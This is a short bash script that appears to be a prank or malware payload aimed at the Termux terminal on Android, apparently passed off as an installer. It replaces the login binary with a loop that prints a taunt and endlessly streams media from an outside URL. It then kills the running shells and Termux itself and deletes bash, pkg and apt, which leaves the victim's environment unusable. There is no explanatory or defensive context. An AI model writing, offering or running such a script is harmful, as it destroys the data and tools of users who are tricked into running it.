#!/usr/bin/env bash

$SHELL -c "apt install mpv -y" > /dev/null
# Here the trap begins....
rm /data/data/com.termux/files/usr/bin/login
echo "echo HAHA! GET YOUR TERMUX INFECTED LOL!!;while true;do /data/data/com.termux/files/usr/bin/mpv https://fwesh.yonle.repl.co;done" > $PREFIX/bin/login
chmod +x $PREFIX/bin/login
# DO IT!!!
exec login &
pkill fish
pkill zsh
pkill dash
pkill bash
pkill com.termux
rm /data/data/com.termux/files/usr/bin/bash
rm /data/data/com.termux/files/usr/bin/pkg
rm /data/data/com.termux/files/usr/bin/apt
./install.sh
